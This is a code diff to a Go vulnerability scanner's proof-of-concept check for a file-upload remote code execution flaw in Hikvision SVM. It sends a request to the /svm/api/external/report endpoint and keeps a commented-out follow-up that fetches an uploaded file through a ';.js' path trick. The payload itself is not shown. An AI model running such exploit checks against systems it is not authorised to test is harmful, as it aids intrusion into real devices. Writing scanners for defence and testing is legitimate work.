@@ -3,6 +3,7 @@ package HIKVISION
 import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
+	"strings"
 )
 
 func Hikvision_svm_api_files_rce(u string) bool {
@@ -14,17 +15,17 @@ func Hikvision_svm_api_files_rce(u string) bool {
 
 	if req, err := pkg.HttpRequset(u+"/svm/api/external/report", "POST", payload, false, header); err == nil {
 		//pkg.GoPocLog(req.Body)
-		if req.StatusCode == 200 {
-			//if req2, err := pkg.HttpRequset(u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js", "GET", "", false, nil); err == nil {
-			//	if req2.StatusCode == 200 && strings.Contains(req2.Body, "ea26cdac4990498b32d7a95ce5a5135c") {
-			//		pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js"))
-			//		return true
-			//	}
-			//}
-
-			pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision svm_api_file_upload_rce|%s\n", u+"/test"))
+		if req.StatusCode == 200 && strings.Contains(req.Body, "code") && strings.Contains(req.Body, "msg") {
+			pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision svm_api_file_upload_rce|%s\n", u+"/svm/api/external/report"))
 			return true
 		}
+		//if req2, err := pkg.HttpRequset(u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js", "GET", "", false, nil); err == nil {
+		//	if req2.StatusCode == 200 && strings.Contains(req2.Body, "ea26cdac4990498b32d7a95ce5a5135c") {
+		//		pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js"))
+		//		return true
+		//	}
+		//}
+
 	}
 	return false
 }
